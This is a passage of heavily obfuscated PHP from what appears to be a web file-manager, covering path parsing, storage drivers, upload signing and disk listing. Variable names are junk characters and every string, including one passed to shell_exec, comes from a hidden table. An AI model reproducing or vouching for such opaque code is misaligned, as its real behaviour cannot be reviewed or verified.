$éş’Å¯ì[12]; } public function download($ûÈ¹İâ“, $ıÂ‚ò¨) { Downloader::start($ûÈ¹İâ“, $ıÂ‚ò¨); return $ıÂ‚ò¨; } } goto Fø•®ÁÉá ; FÚó¨Òö×ì: class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\162\122\x65\143\x79\143\x6c\x65\175"; const KOD_USER_FAV = "\173\165\x73\145\162\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\106\x69\x6c\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\106\151\x6c\x65\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\x70\122\x6f\x6f\x74\123\145\154\146\175"; const KOD_USER_SHARE = "\173\x75\x73\145\x72\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\162\123\150\x61\162\145\114\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\145\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\x72\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\173\163\150\x61\162\145\x49\164\x65\x6d\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\x68\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\x65\156\143\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\x76\x65\162\x7d"; public static function typeList() { $û”ÇŒ€ =& $_SERVER[‚ûòÉ˜ş]; return array($û”ÇŒ€[1292] => self::KOD_SOURCE, $û”ÇŒ€[1293] => self::KOD_USER_RECYCLE, $û”ÇŒ€[1294] => self::KOD_USER_FAV, $û”ÇŒ€[1295] => self::KOD_USER_FILE_TAG, $û”ÇŒ€[1296] => self::KOD_USER_FILE_TYPE, $û”ÇŒ€[1297] => self::KOD_GROUP_ROOT_SELF, $û”ÇŒ€[1298] => self::KOD_USER_SHARE, $û”ÇŒ€[1299] => self::KOD_USER_SHARE_LINK, $û”ÇŒ€[1300] => self::KOD_USER_SHARE_TO_ME, $û”ÇŒ€[1301] => self::KOD_SHARE_ITEM, $û”ÇŒ€[1302] => self::KOD_SHARE_LINK, $û”ÇŒ€[1303] => self::KOD_SEARCH, $û”ÇŒ€[1304] => self::KOD_BLOCK, $û”ÇŒ€[1305] => self::KOD_IO, $û”ÇŒ€[1306] => self::KOD_USER_RECENT, $û”ÇŒ€[1307] => self::KOD_USER_DRIVER); } public static function parse($—¿‹ƒÂ) { $ÀÆÔÏæŸ =& $_SERVER[‚ûòÉ˜ş]; $—¿‹ƒÂ = self::clear($—¿‹ƒÂ); $©ÓĞ³¦ = array_values(self::typeList()); preg_match($ÀÆÔÏæŸ[1308], $—¿‹ƒÂ, $ÕŒùÊè); $ŞÉ¹ó„½ = array($ÀÆÔÏæŸ[472] => !1, $ÀÆÔÏæŸ[1309] => !1, $ÀÆÔÏæŸ[469] => !1, $ÀÆÔÏæŸ[94] => $—¿‹ƒÂ, $ÀÆÔÏæŸ[1210] => !1, $ÀÆÔÏæŸ[1209] => $ÀÆÔÏæŸ[12]); if (is_array($ÕŒùÊè) && count($ÕŒùÊè) == 5) { $œ¹úíÁŞ = $ÀÆÔÏæŸ[1310] . $ÕŒùÊè[2] . $ÀÆÔÏæŸ[380]; if (in_array($œ¹úíÁŞ, $©ÓĞ³¦)) { $ŞÉ¹ó„½[$ÀÆÔÏæŸ[1210]] = $ÕŒùÊè[1]; $ŞÉ¹ó„½[$ÀÆÔÏæŸ[43]] = $œ¹úíÁŞ; $ŞÉ¹ó„½[$ÀÆÔÏæŸ[1311]] = substr($œ¹úíÁŞ, 1, -1); $ŞÉ¹ó„½[$ÀÆÔÏæŸ[451]] = $ÕŒùÊè[3]; } $ŞÉ¹ó„½[$ÀÆÔÏæŸ[1209]] = $ÕŒùÊè[4]; } $±š©‡¼œ = array($ÀÆÔÏæŸ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ŞÉ¹ó„½[$ÀÆÔÏæŸ[1274]] = in_array($ŞÉ¹ó„½[$ÀÆÔÏæŸ[43]], $±š©‡¼œ); return $ŞÉ¹ó„½; } public static function isTruePath($ù¥ÒĞñ“) { $ï­È÷–İ =& $_SERVER[‚ûòÉ˜ş]; if (substr($ù¥ÒĞñ“, 0, 1) != $ï­È÷–İ[1310]) { return !0; } if (strpos($ù¥ÒĞñ“, $ï­È÷–İ[459]) === 0) { return !0; } if (strpos($ù¥ÒĞñ“, $ï­È÷–İ[1278]) === 0) { return !0; } if (strpos($ù¥ÒĞñ“, $ï­È÷–İ[1312]) === 0) { return !0; } if (strpos($ù¥ÒĞñ“, $ï­È÷–İ[1313]) === 0) { return !0; } if (strpos($ù¥ÒĞñ“, $ï­È÷–İ[1314]) === 0) { return !0; } return !1; } public static function clear($Ïçê‹ëì) { $¿‘©…Æ© =& $_SERVER[‚ûòÉ˜ş]; $Ïçê‹ëì = str_replace(array($¿‘©…Æ©[1119], $¿‘©…Æ©[18]), $¿‘©…Æ©[63], $Ïçê‹ëì); $Ïçê‹ëì = str_replace($¿‘©…Æ©[107], $¿‘©…Æ©[8], $Ïçê‹ëì); $Öš˜¹– = $¿‘©…Æ©[1315]; if (substr($Ïçê‹ëì, 0, 3) == $¿‘©…Æ©[1316]) { $Ïçê‹ëì = substr($Ïçê‹ëì, 3); } while (strstr($Ïçê‹ëì, $Öš˜¹–)) { $Ïçê‹ëì = str_replace($Öš˜¹–, $¿‘©…Æ©[8], $Ïçê‹ëì); } $Ïçê‹ëì = preg_replace($¿‘©…Æ©[1317], $¿‘©…Æ©[8], $Ïçê‹ëì); if ($Ïçê‹ëì == $¿‘©…Æ©[8]) { return $¿‘©…Æ©[8]; } $Ïçê‹ëì = rtrim($Ïçê‹ëì, $¿‘©…Æ©[8]); return $Ïçê‹ëì; } public static function pathTrue($ÅÉ˜İÅµ) { $ğòìßµç =& $_SERVER[‚ûòÉ˜ş]; if (!$ÅÉ˜İÅµ) { return $ğòìßµç[12]; } $ÅÉ˜İÅµ = str_replace($ğòìßµç[569], $ğòìßµç[8], str_replace($ğòìßµç[1318], $ğòìßµç[8], $ÅÉ˜İÅµ)); $ÅÉ˜İÅµ = str_replace($ğòìßµç[569], $ğòìßµç[8], str_replace($ğòìßµç[1318], $ğòìßµç[8], $ÅÉ˜İÅµ)); if (!strstr($ÅÉ˜İÅµ, $ğòìßµç[1316])) { return $ÅÉ˜İÅµ; } $ôİ¾ß¯ = explode($ğòìßµç[8], $ÅÉ˜İÅµ); foreach ($ôİ¾ß¯ as $«à‚ë•» => $óóº÷²) { if ($óóº÷² !== $ğòìßµç[1319]) { continue; } for ($îŸÔÄ£ = $«à‚ë•»; $îŸÔÄ£ >= 0; $îŸÔÄ£--) { if ($ôİ¾ß¯[$îŸÔÄ£] === $ğòìßµç[10] || $ôİ¾ß¯[$îŸÔÄ£] === $ğòìßµç[1319] || $ôİ¾ß¯[$îŸÔÄ£] === -1) { continue; } if ($ôİ¾ß¯[$îŸÔÄ£] === $ğòìßµç[12]) { $ôİ¾ß¯[$«à‚ë•»] = -1; break; } $ôİ¾ß¯[$«à‚ë•»] = -1; $ôİ¾ß¯[$îŸÔÄ£] = -1; break; } } $åØóÄùğ = array(); foreach ($ôİ¾ß¯ as $óóº÷²) { if ($óóº÷² !== -1) { $åØóÄùğ[] = $óóº÷²; } } $ñ»•ÀÜ = implode($ğòìßµç[8], $åØóÄùğ); if (strpos($ñ»•ÀÜ, $ğòìßµç[1320]) === 0) { $ñ»•ÀÜ = $ğòìßµç[1316] . substr($ñ»•ÀÜ, strlen($ğòìßµç[1320])); } return $ñ»•ÀÜ; } public static function sourceID($íŸ§ä) { $îƒ®ÆÙœ =& $_SERVER[‚ûòÉ˜ş]; $ĞûĞä´å = self::parse($íŸ§ä); if ($ĞûĞä´å[$îƒ®ÆÙœ[43]] !== self::KOD_SOURCE) { show_json(LNG($îƒ®ÆÙœ[1321]), !1); } return $ĞûĞä´å[$îƒ®ÆÙœ[451]]; } public static function make($ˆˆô’) { if (!$ˆˆô’) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ˆˆô’)); } public static function makeShare($ñö«èïš, $©ÈÀ·ê) { return self::makePath(self::KOD_SHARE_ITEM, $ñö«èïš, $©ÈÀ·ê); } public static function makeFileTypePath($˜•ˆé†¼) { return self::makePath(self::KOD_USER_FILE_TYPE, $˜•ˆé†¼); } public static function makeFileTagPath($ŒËµãÈó) { return self::makePath(self::KOD_USER_FILE_TAG, $ŒËµãÈó); } public static function makePath($ËİòÈ¶Æ, $‰–­şòÑ = '', $©¼·áõ = '') { $óòë‘ÏÚ =& $_SERVER[‚ûòÉ˜ş]; $ÀäşÃ† = substr($ËİòÈ¶Æ, 1, -1); $ùÇÜÛÃÅ = $óòë‘ÏÚ[1322] . $ÀäşÃ† . $óòë‘ÏÚ[1323] . $‰–­şòÑ . $óòë‘ÏÚ[1324]; $ùÇÜÛÃÅ = $©¼·áõ ? $ùÇÜÛÃÅ . $©¼·áõ . $óòë‘ÏÚ[8] : $ùÇÜÛÃÅ; return $ùÇÜÛÃÅ; } public static function hashPath($˜‹«µÈ, $ÜÁàÉ”‘ = true) { $÷è€¾ù« =& $_SERVER[‚ûòÉ˜ş]; $ Î¸èÏù = is_array($˜‹«µÈ) ? $˜‹«µÈ : IO::info($˜‹«µÈ); $–ĞòïĞ» = _get($ Î¸èÏù, $÷è€¾ù«[1325], $÷è€¾ù«[12]); if (!$–ĞòïĞ» && isset($ Î¸èÏù[$÷è€¾ù«[229]])) { $–ĞòïĞ» = trim($ Î¸èÏù[$÷è€¾ù«[229]], $÷è€¾ù«[128]); } if (!$–ĞòïĞ» && isset($ Î¸èÏù[$÷è€¾ù«[191]]) && $ Î¸èÏù[$÷è€¾ù«[191]]) { $ Î¸èÏù = IO::info(KodIO::make($ Î¸èÏù[$÷è€¾ù«[191]])); $–ĞòïĞ» = _get($ Î¸èÏù, $÷è€¾ù«[1325], $÷è€¾ù«[12]); } $¿¼íÁÛ = md5($ Î¸èÏù[$÷è€¾ù«[94]] . $ Î¸èÏù[$÷è€¾ù«[86]] . $ Î¸èÏù[$÷è€¾ù«[95]]); if (!$–ĞòïĞ» && file_exists($ Î¸èÏù[$÷è€¾ù«[94]])) { $–ĞòïĞ» = Cache::get($¿¼íÁÛ . $÷è€¾ù«[1326]); $–ĞòïĞ» = !1; if (!$–ĞòïĞ») { $–ĞòïĞ» = IO::hashSimple($ Î¸èÏù[$÷è€¾ù«[94]]); Cache::set($¿¼íÁÛ . $÷è€¾ù«[1326], $–ĞòïĞ», 3600 * 24 * 30); } } if ($ÜÁàÉ”‘ && !$–ĞòïĞ») { } return $–ĞòïĞ» ? $–ĞòïĞ» : $¿¼íÁÛ; } public static function hashPathSafe($Œµ£‘™ğ, $ô·ÚÄò  = true) { $•øØÀ•Ù =& $_SERVER[‚ûòÉ˜ş]; $ÃÍ ÂÕÂ = self::hashPath($Œµ£‘™ğ, $ô·ÚÄò ); return md5($ÃÍ ÂÕÂ . $•øØÀ•Ù[1327] . Model($•øØÀ•Ù[810])->get($•øØÀ•Ù[811])); } public static function initSystemPath() { $»í¾öñÃ =& $_SERVER[‚ûòÉ˜ş]; if (defined($»í¾öñÃ[1328])) { return; } define($»í¾öñÃ[1328], self::systemPath($»í¾öñÃ[189])); define($»í¾öñÃ[1329], self::systemPath($»í¾öñÃ[1330])); define($»í¾öñÃ[1331], self::systemPath($»í¾öñÃ[1332])); define($»í¾öñÃ[1333], self::systemPath($»í¾öñÃ[1334])); IOHistory::bindEvent(); } public static function systemPath($ËÅ­•´¸) { $æïÉ«º– =& $_SERVER[‚ûòÉ˜ş]; $½Ëä“¨‡ = $æïÉ«º–[1335] . ucfirst($ËÅ­•´¸); $â¡•åõé = Model($æïÉ«º–[810])->get($½Ëä“¨‡); if ($â¡•åõé) { return $â¡•åõé; } if ($ËÅ­•´¸ == $æïÉ«º–[189]) { $â¡•åõé = self::make(Model($æïÉ«º–[865])->systemRootPathAdd($æïÉ«º–[582])); } else { $â¡•åõé = self::systemPath($æïÉ«º–[189]); $É…ñÔê = self::sourceID($â¡•åõé); $â¡•åõé = self::make(Model($æïÉ«º–[865])->mkdir($É…ñÔê, $ËÅ­•´¸)); } Model($æïÉ«º–[810])->set($½Ëä“¨‡, $â¡•åõé); return $â¡•åõé; } public static function systemFolder($ÇÂœ†¶²) { $Ç¥¦ò‹ = IO_PATH_SYSTEM_SOURCE . $ÇÂœ†¶²; $Èæ¨Ì˜½ = Cache::get($Ç¥¦ò‹); if (!$Èæ¨Ì˜½) { $ÕƒÚºÚè = IO::infoFullSimple($Ç¥¦ò‹); if (!$ÕƒÚºÚè) { $Èæ¨Ì˜½ = IO::mkdir($Ç¥¦ò‹, REPEAT_SKIP); } else { $Èæ¨Ì˜½ = $ÕƒÚºÚè[$_SERVER[‚ûòÉ˜ş][94]]; } Cache::set($Ç¥¦ò‹, $Èæ¨Ì˜½, 3600 * 10); } return $Èæ¨Ì˜½; } public static function defaultDriver() { return Model($_SERVER[‚ûòÉ˜ş][807])->defaultDriver(); } public static function defaultIO() { $ÕÎ¡â« =& $_SERVER[‚ûòÉ˜ş]; $ÀŸ„‹Ç = self::defaultDriver(); return $ÕÎ¡â«[1336] . $ÀŸ„‹Ç[$ÕÎ¡â«[451]] . $ÕÎ¡â«[1324]; } public static function defaultDriverInit() { static $ûİ¦‰½« = false; if ($ûİ¦‰½«) { return $ûİ¦‰½«; } $ûİ¦‰½« = IO::init(self::defaultIO()); return $ûİ¦‰½«; } public static function fileTypeList() { $×ÚÕ”† =& $_SERVER[‚ûòÉ˜ş]; $ìó¾Û± = $GLOBALS[$×ÚÕ”†[6]][$×ÚÕ”†[1337]]; foreach ($ìó¾Û± as $Â½ğ«²ˆ => $¶ŸÊ¬ü) { $ˆÄ²˜Ñ = $×ÚÕ”†[1338] . $Â½ğ«²ˆ; $ïö©çïÛ = LNG($ˆÄ²˜Ñ); if ($ˆÄ²˜Ñ != $ïö©çïÛ) { $ìó¾Û±[$Â½ğ«²ˆ][$×ÚÕ”†[42]] = $ïö©çïÛ; } } return $ìó¾Û±; } public static function diskList($ÙÂİ´×à = true) { $ê­²£Åë = $_SERVER[‚ûòÉ˜ş][1339]; if ($ÙÂİ´×à) { $ªˆ„üù„ = Cache::get($ê­²£Åë); if (is_array($ªˆ„üù„)) { return $ªˆ„üù„; } } $ªˆ„üù„ = self::diskListGet(); Cache::set($ê­²£Åë, $ªˆ„üù„, 60); return $ªˆ„üù„; } public static function diskListGet() { $˜«™®Õ¯ =& $_SERVER[‚ûòÉ˜ş]; $äØĞÅ£ı = array(); if ($GLOBALS[$˜«™®Õ¯[6]][$˜«™®Õ¯[1340]] == $˜«™®Õ¯[1341]) { $Š·”æ–“ = $˜«™®Õ¯[1342]; for ($Ù·¡óİ‰ = 0; $Ù·¡óİ‰ < strlen($Š·”æ–“); $Ù·¡óİ‰++) { $“¸‰ÎŒÏ = $Š·”æ–“[$Ù·¡óİ‰] . $˜«™®Õ¯[1343]; if (file_exists($“¸‰ÎŒÏ)) { $äØĞÅ£ı[] = $“¸‰ÎŒÏ; } } return $äØĞÅ£ı; } if (!function_exists($˜«™®Õ¯[108])) { $äØĞÅ£ı[] = $˜«™®Õ¯[876]; return $äØĞÅ£ı; } $ÛöÌÊƒ = explode($˜«™®Õ¯[18], shell_exec($˜«™®Õ¯[1344])); array_shift($ÛöÌÊƒ); array_pop($ÛöÌÊƒ); $ÔĞªŸ = array($˜«™®Õ¯[1345], $˜«™®Õ¯[1346], $˜«™®Õ¯[1347], $˜«™®Õ¯[1348], $˜«™®Õ¯[1349], $˜«™®Õ¯[1350], $˜«™®Õ¯[1351], $˜«™®Õ¯[1352]); foreach ($ÛöÌÊƒ as $ÅÛ÷Õ¥) { $ÊÆÄÊ“¥ = preg_split($˜«™®Õ¯[1353], $ÅÛ÷Õ¥); $“¸‰ÎŒÏ = $ÊÆÄÊ“¥[count($ÊÆÄÊ“¥) - 1]; if (!strstr($ÊÆÄÊ“¥[0], $˜«™®Õ¯[1354]) || !$“¸‰ÎŒÏ) { continue; } $ü™°§— = rtrim($“¸‰ÎŒÏ, $˜«™®Õ¯[8]) . $˜«™®Õ¯[8]; if (in_array($ü™°§—, $ÔĞªŸ)) { continue; } $äØĞÅ£ı[] = $ü™°§—; } return $äØĞÅ£ı; } public static function isSameDisk($¼ğõõ­†, $ÜŠÃû¹) { $ÔŸ£õÊØ =& $_SERVER[‚ûòÉ˜ş]; if ($GLOBALS[$ÔŸ£õÊØ[6]][$ÔŸ£õÊØ[1340]] == $ÔŸ£õÊØ[1341]) { return strtolower(substr($¼ğõõ­†, 0, 1)) == strtolower(substr($ÜŠÃû¹, 0, 1)); } $¸Ïº‘‰Ì = self::diskList(); $Á°°Ìˆ§ = !1; $¶øÂ¶—ô = !1; sort($¸Ïº‘‰Ì); $¸Ïº‘‰Ì = array_reverse($¸Ïº‘‰Ì); $¼ğõõ­† = rtrim($¼ğõõ­†, $ÔŸ£õÊØ[8]) . $ÔŸ£õÊØ[8]; $ÜŠÃû¹ = rtrim($ÜŠÃû¹, $ÔŸ£õÊØ[8]) . $ÔŸ£õÊØ[8]; foreach ($¸Ïº‘‰Ì as $¤ğîúÔ¤) { $”¢ÈÕĞ­ = strlen($¤ğîúÔ¤); if (!$Á°°Ìˆ§ && substr($¼ğõõ­†, 0, $”¢ÈÕĞ­) == $¤ğîúÔ¤) { $Á°°Ìˆ§ = $¤ğîúÔ¤; } if (!$¶øÂ¶—ô && substr($ÜŠÃû¹, 0, $”¢ÈÕĞ­) == $¤ğîúÔ¤) { $¶øÂ¶—ô = $¤ğîúÔ¤; } if ($Á°°Ìˆ§ && $¶øÂ¶—ô) { break; } } return $Á°°Ìˆ§ === $¶øÂ¶—ô; } public static function transferType($í„ÉÏŸ¤, $åí€çİ) { $úÑÄœÊÎ =& $_SERVER[‚ûòÉ˜ş]; $¢ùúå³× = self::driverType($í„ÉÏŸ¤); $ºÖè¨ÂÂ = self::driverType($åí€çİ); if ($¢ùúå³×[$úÑÄœÊÎ[43]] == $ºÖè¨ÂÂ[$úÑÄœÊÎ[43]] && $¢ùúå³×[$úÑÄœÊÎ[1355]] == $ºÖè¨ÂÂ[$úÑÄœÊÎ[1355]]) { return $úÑÄœÊÎ[1356]; } if ($¢ùúå³×[$úÑÄœÊÎ[43]] == $úÑÄœÊÎ[909] && $ºÖè¨ÂÂ[$úÑÄœÊÎ[43]] == $úÑÄœÊÎ[116]) { return $úÑÄœÊÎ[1235]; } if ($¢ùúå³×[$úÑÄœÊÎ[43]] == $úÑÄœÊÎ[116] && $ºÖè¨ÂÂ[$úÑÄœÊÎ[43]] == $úÑÄœÊÎ[909]) { return $úÑÄœÊÎ[117]; } return $úÑÄœÊÎ[1357]; } public static function driverType($Óºæ‡Óâ) { $´×ÏÛ‡Ç =& $_SERVER[‚ûòÉ˜ş]; $Ü·¦¥¶ = str_replace($´×ÏÛ‡Ç[1358], $´×ÏÛ‡Ç[12], strtolower($Óºæ‡Óâ->getType())); if ($Ü·¦¥¶ == $´×ÏÛ‡Ç[797] || $Ü·¦¥¶ == $´×ÏÛ‡Ç[1359] || $Ü·¦¥¶ == $´×ÏÛ‡Ç[1360]) { $Óºæ‡Óâ = self::defaultDriverInit(); } else { if ($Ü·¦¥¶ == $´×ÏÛ‡Ç[1245] || $Ü·¦¥¶ == $´×ÏÛ‡Ç[1361]) { $Óºæ‡Óâ = IO::init($Óºæ‡Óâ->pathParse[$´×ÏÛ‡Ç[1192]]); } } $´ÛÜĞÃá = $Óºæ‡Óâ->path; $Ü·¦¥¶ = str_replace($´×ÏÛ‡Ç[1358], $´×ÏÛ‡Ç[12], strtolower($Óºæ‡Óâ->getType())); if ($Ü·¦¥¶ == $´×ÏÛ‡Ç[116]) { return array($´×ÏÛ‡Ç[43] => $´×ÏÛ‡Ç[116], $´×ÏÛ‡Ç[1355] => $´×ÏÛ‡Ç[12], $´×ÏÛ‡Ç[94] => $´ÛÜĞÃá, $´×ÏÛ‡Ç[105] => $Óºæ‡Óâ); } return array($´×ÏÛ‡Ç[43] => $´×ÏÛ‡Ç[909], $´×ÏÛ‡Ç[1355] => $Óºæ‡Óâ->pathDriver, $´×ÏÛ‡Ç[94] => $´ÛÜĞÃá, $´×ÏÛ‡Ç[105] => $Óºæ‡Óâ); } public static function pathDriverType($ˆÑôíè) { return $ˆÑôíè ? self::driverType(IO::init($ˆÑôíè)) : !1; } public static function pathDriverLocal($­¢—š©Ê) { $¬÷µÛÕ =& $_SERVER[‚ûòÉ˜ş]; $Ô²Åáš˜ = $­¢—š©Ê ? self::driverType(IO::init($­¢—š©Ê)) : !1; return $Ô²Åáš˜[$¬÷µÛÕ[43]] == $¬÷µÛÕ[116] ? !0 : !1; } public static function allowCover($¾ïÓ…Áú, $ÂŒµÖó“ = true) { $Á¡’Õ¯‰ =& $_SERVER[‚ûòÉ˜ş]; if (is_string($¾ïÓ…Áú)) { $¾ïÓ…Áú = IO::info($¾ïÓ…Áú); } if (!$¾ïÓ…Áú || $¾ïÓ…Áú[$Á¡’Õ¯‰[43]] == $Á¡’Õ¯‰[85] || $¾ïÓ…Áú[$Á¡’Õ¯‰[86]] <= 100) { return !1; } if (isset($¾ïÓ…Áú[$Á¡’Õ¯‰[1362]]) || !$¾ïÓ…Áú[$Á¡’Õ¯‰[94]]) { return !1; } if (isset($¾ïÓ…Áú[$Á¡’Õ¯‰[226]]) && !$¾ïÓ…Áú[$Á¡’Õ¯‰[226]]) { return !1; } static $ôò¬’ê = false; if (!$ôò¬’ê || !$ÂŒµÖó“) { $Ô÷ı¢‡² = self::driverType(IO::init($¾ïÓ…Áú[$Á¡’Õ¯‰[94]])); $õ×†Á¢˜ = $Ô÷ı¢‡²[$Á¡’Õ¯‰[105]]; $ôò¬’ê = $Á¡’Õ¯‰[194]; if ($Ô÷ı¢‡²[$Á¡’Õ¯‰[43]] == $Á¡’Õ¯‰[116]) { $ôò¬’ê = $Á¡’Õ¯‰[1363]; } if ($Ô÷ı¢‡²[$Á¡’Õ¯‰[105]] && is_array($Ô÷ı¢‡²[$Á¡’Õ¯‰[105]]->config)) { $ÒÆ†”š¾ = $Ô÷ı¢‡²[$Á¡’Õ¯‰[105]]->config; if (isset($ÒÆ†”š¾[$Á¡’Õ¯‰[1364]]) && $ÒÆ†”š¾[$Á¡’Õ¯‰[1364]]) { $ôò¬’ê = $Á¡’Õ¯‰[1363]; } } } return $ôò¬’ê == $Á¡’Õ¯‰[1363] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¡Ëšû¸¨) { parent::__construct($¡Ëšû¸¨); $this->signatureVersion($_SERVER[‚ûòÉ˜ş][241]); } public function uploadFormData($„ø«¤’, $å¹ŒƒÊ = 3600) { $ÇÚ› =& $_SERVER[‚ûòÉ˜ş]; $†º„¾õå = $ÇÚ›[223]; $Øö¢ş« = $ÇÚ›[256]; $ø½©÷­Ô = $ÇÚ›[266]; $Ê“İçŠï = gmdate($ÇÚ›[1365], time() + $å¹ŒƒÊ); $úÑ–èß = (string) time() . $ÇÚ›[81] . (string) (time() + $å¹ŒƒÊ); $¥ºˆ˜ú¯ = array($ÇÚ›[267] => $Ê“İçŠï, $ÇÚ›[270] => array(array($ÇÚ›[272] => $†º„¾õå), array($ÇÚ›[271] => $this->bucket), array($ÇÚ›[273], $ÇÚ›[274], $ÇÚ›[12]), array($ÇÚ›[277] => $ø½©÷­Ô), array($ÇÚ›[1366] => $Øö¢ş«), array($ÇÚ›[1367] => $this->accessKey), array($ÇÚ›[1368] => $úÑ–èß))); $¥ºˆ˜ú¯ = json_encode($¥ºˆ˜ú¯); $›ªÇ·»– = hash_hmac($ÇÚ›[256], $úÑ–èß, $this->secret); $–ô¶‚ = sha1($¥ºˆ˜ú¯); $ÛŠ©¬Åô = hash_hmac($ÇÚ›[256], $–ô¶‚, $›ªÇ·»–); $·Ëò¶ğ§ = array($ÇÚ›[272] => $†º„¾õå, $ÇÚ›[277] => $ø½©÷­Ô, $ÇÚ›[285] => base64_encode($¥ºˆ˜ú¯), $ÇÚ›[1366] => $Øö¢ş«, $ÇÚ›[1367] => $this->accessKey, $ÇÚ›[1369] => $úÑ–èß, $ÇÚ›[1370] => $ÛŠ©¬Åô, $ÇÚ›[206] => $this->getHost()); return $·Ëò¶ğ§; } public function fileOutLink($Å– ‹Õ´) { $Ñõ­¥¥ =& $_SERVER[‚ûòÉ˜ş]; if (substr($Å– ‹Õ´, 0, 7) == $Ñõ­¥¥[1371]) { $Å– ‹Õ´ = $Ñõ­¥¥[1372] . substr($Å– ‹Õ´, 7); } header($Ñõ­¥¥[172] . $Å– ‹Õ´); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¼šØ›) { $this->pathParse = $¼šØ›; $this->model = Model($_SERVER[‚ûòÉ˜ş][1373]); } public function getPath($ûı§ëÜ’) { return trim($ûı§ëÜ’, $_SERVER[‚ûòÉ˜ş][8]); } public function pathFather($ù‰‰ŸÁŸ) { $§šìŠ†ó = $this->parse($ù‰‰ŸÁŸ); $§šìŠ†ó = $this->infoSimple($ù‰‰ŸÁŸ); return $§šìŠ†ó ? $§šìŠ†ó[$_SERVER[‚ûòÉ˜ş][190]] : !1; } public function pathThis($çßÉ«íû) { $î«Ò¾çş = $this->infoSimple($çßÉ«íû); return $î«Ò¾çş ? $î«Ò¾çş[$_SERVER[‚ûòÉ˜ş][42]] : !1; } public function getPathOuter($·äƒóÜí) { if (!$·äƒóÜí) { return $·äƒóÜí; } $Öœ¿Òì¢ = $this->parse($·äƒóÜí); return KodIO::make($Öœ¿Òì¢[$_SERVER[‚ûòÉ˜ş][451]]); } public function copyFolderFromIO($œçûšÈı, $ßÚ¸‹Ğ, $¬úŒÏÄó, $¨áƒ„õÆ, $—´—Èá) { $ò¥¶ğ = $this->model->copyFolderFromIO($œçûšÈı, $ßÚ¸‹Ğ, $¬úŒÏÄó, $¨áƒ„õÆ, $—´—Èá); return KodIO::make($ò¥¶ğ); } public function isParentOf($İæÕ„Ø‘, $™ÂıÁ…) { return $this->model->isParentOf($İæÕ„Ø‘, $™ÂıÁ…); } public function mkfile($“–½…Àˆ, $¯Å¾‘…ˆ = '', $ÆÂÑ°‰Å = REPEAT_RENAME) { $´ü× ñù =& $_SERVER[‚ûòÉ˜ş]; $ıÆ¥Š¥­ = $this->parse($“–½…Àˆ); $“–½…Àˆ = $ıÆ¥Š¥­[$´ü× ñù[451]]; for ($²ÜÏáûˆ = 0; $²ÜÏáûˆ < count($ıÆ¥Š¥­[$´ü× ñù[1374]]); $²ÜÏáûˆ++) { $â¿“Ûö = $ıÆ¥Š¥­[$´ü× ñù[1374]][$²ÜÏáûˆ]; if ($²ÜÏáûˆ == count($ıÆ¥Š¥­[$´ü× ñù[1374]]) - 1) { $“–½…Àˆ = $this->model->mkfile($“–½…Àˆ, $â¿“Ûö, $¯Å¾‘…ˆ, $ÆÂÑ°‰Å); break; } $“–½…Àˆ = $this->model->mkdir($“–½…Àˆ, $â¿“Ûö, REPEAT_SKIP); } return $this->getPathOuter($“–½…Àˆ); } public function mkdir($ÍäÍÙÒµ, $Æ·÷›ë = REPEAT_SKIP) { $˜Ğ¡ÈÑ =& $_SERVER[‚ûòÉ˜ş]; $»«áÎé© = $this->parse($ÍäÍÙÒµ); $ÍäÍÙÒµ = $»«áÎé©[$˜Ğ¡ÈÑ[451]]; for ($òû‰©«é = 0; $òû‰©«é < count($»«áÎé©[$˜Ğ¡ÈÑ[1374]]); $òû‰©«é++) { $”œ¹×Ñ = $»«áÎé©[$˜Ğ¡ÈÑ[1374]][$òû‰©«é]; $ÍäÍÙÒµ = $this->model->mkdir($ÍäÍÙÒµ, $”œ¹×Ñ, $Æ·÷›ë); } return $this->getPathOuter($ÍäÍÙÒµ); } public function copyFile($õ•¶ŞŠã, $µ÷¦õãà, $Ó¡Œ¦ä = REPEAT_REPLACE) { $Ù½Ğ˜ =& $_SERVER[‚ûòÉ˜ş]; $§À¹¾ô¤ = $this->parse($µ÷¦õãà); $ÒĞ¸Ôİ† = $this->model->copy($õ•¶ŞŠã, $§À¹¾ô¤[$Ù½Ğ˜[451]], $Ó¡Œ¦ä, $§À¹¾ô¤[$Ù½Ğ˜[94]]); return $ÒĞ¸Ôİ† ? $this->getPathOuter($ÒĞ¸Ôİ†) : !1; } public function moveFile($ÇÀçË¾, $ÇËÅ–¬, $÷ØãöĞ… = REPEAT_REPLACE) { $ô°©…± =& $_SERVER[‚ûòÉ˜ş]; $Ğ…Ëµ©’ = $this->parse($ÇËÅ–¬); $í›˜¡¾ = $this->model->move($ÇÀçË¾, $Ğ…Ëµ©’[$ô°©…±[451]], $÷ØãöĞ…, $Ğ…Ëµ©’[$ô°©…±[94]]); return $í›˜¡¾ ? $this->getPathOuter($í›˜¡¾) : !1; } public function copy($ŠÏË§Â, $Ö‡÷–ú, $ÈÑÎìö = REPEAT_REPLACE, $ÖÛêÆ§æ = false) { $Â–Æƒôá = $this->parse($Ö‡÷–ú); $ú†üÁÆ = $this->model->copy($ŠÏË§Â, $Â–Æƒôá[$_SERVER[‚ûòÉ˜ş][451]], $ÈÑÎìö, $ÖÛêÆ§æ); return $ú†üÁÆ ? 